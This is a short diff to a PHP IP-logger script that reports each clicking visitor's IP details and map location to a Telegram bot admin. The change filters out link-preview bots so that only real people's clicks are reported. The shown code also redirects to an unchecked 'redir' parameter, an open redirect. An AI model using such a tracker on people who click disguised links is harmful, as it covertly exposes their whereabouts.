@@ -24,6 +24,8 @@ require('telegramapi.php');
 require('config.php');
 require('ipapi.php');
 require('tinyurlapi.php');
+require('browsers_ignore.php');
+
 
 if (isset($_GET['redir']) && empty($_GET['geox']) ) header('Location: '.$_GET['redir']);
 
@@ -54,18 +56,22 @@ if ($res !== null){
 	}
 }
 $message .= "source code: https://github.com/91DarioDev/iplogger";
-$first_message = sendMessage($bot_admin_id, $message);
+// ignore bots click
+if (!in_array($_SERVER['HTTP_USER_AGENT'], $BROWSERS_TO_IGNORE)) {
+  $first_message = sendMessage($bot_admin_id, $message);
 
-if ($res !== null){
-	sendLocation(
-		$bot_admin_id, 
-		(float)$res['lat'], 
-		(float)$res['lon'],
-        null,
-        false,
-        (int)$first_message['result']['message_id']
-	);
+  if ($res !== null){
+      sendLocation(
+          $bot_admin_id, 
+          (float)$res['lat'], 
+          (float)$res['lon'],
+          null,
+          false,
+          (int)$first_message['result']['message_id']
+      );
+  }
 }
+
 
 if ( $_GET['geox'] == 'true') {
 	if (isset($_GET['redir']) ){
